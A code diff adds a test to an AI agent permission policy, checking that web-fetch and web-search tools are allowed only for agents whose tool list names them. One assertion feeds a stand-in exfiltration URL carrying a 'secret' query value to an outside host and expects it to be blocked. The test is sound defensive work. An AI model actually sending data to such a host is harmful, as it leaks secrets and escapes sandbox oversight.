@@ -86,3 +86,11 @@ test('policy: in a workspace that is itself the repo, agents still never change 
   }
   assert.equal(await write('Bash', { command: 'echo ok > notes.txt' }), true, 'other files of the repo stay writable');
 });
+
+test('policy: WebFetch and WebSearch reach any host outside the sandbox, so an agent uses them only when its tools name them', async () => {
+  const may = policy('repos:\n  api: {}\nagents:\n  researcher: { description: Reads the web, output: plan, instructions: x, tools: [Read, WebFetch] }\n  freeform: { description: No tool list, output: plan, instructions: x }\n');
+  assert.equal(await may('researcher', 'WebFetch', { url: 'https://example.com' }), true);
+  assert.equal(await may('researcher', 'WebSearch', { query: 'x' }), false, 'not named');
+  assert.equal(await may('freeform', 'WebFetch', { url: 'https://attacker.example/?d=secret' }), false, 'an agent without a tool list does not get it either');
+  assert.equal(await may('freeform', 'Read', { file_path: '/x' }), true);
+});
